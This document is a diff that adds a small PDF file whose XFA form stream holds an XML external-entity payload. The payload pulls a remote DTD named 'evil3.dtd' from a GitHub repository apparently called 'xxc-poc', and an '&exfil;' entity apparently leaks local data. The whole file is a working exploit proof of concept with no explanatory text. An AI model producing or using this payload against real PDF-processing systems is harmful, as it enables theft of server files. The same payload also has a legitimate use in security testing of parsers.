@@ -1,0 +1,36 @@
+%PDF-1.4
+%‚„œ”
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /AcroForm << /XFA 4 0 R >> >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> >>
+endobj
+4 0 obj
+<< /Length 326 >>
+stream
+<?xml version="1.0"?>
+<!DOCTYPE xfa:datasets [
+<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/d1v1l/xxc-poc/main/evil3.dtd">
+%dtd;
+]>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/" xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
+<xfa:datasets><xfa:data><leak>&exfil;</leak></xfa:data></xfa:datasets>
+</xdp:xdp>
+endstream
+endobj
+xref
+0 5
+0000000000 65535 f 
+0000000015 00000 n 
+0000000091 00000 n 
+0000000148 00000 n 
+0000000236 00000 n 
+trailer
+<< /Size 5 /Root 1 0 R >>
+startxref
+611
+%%EOF
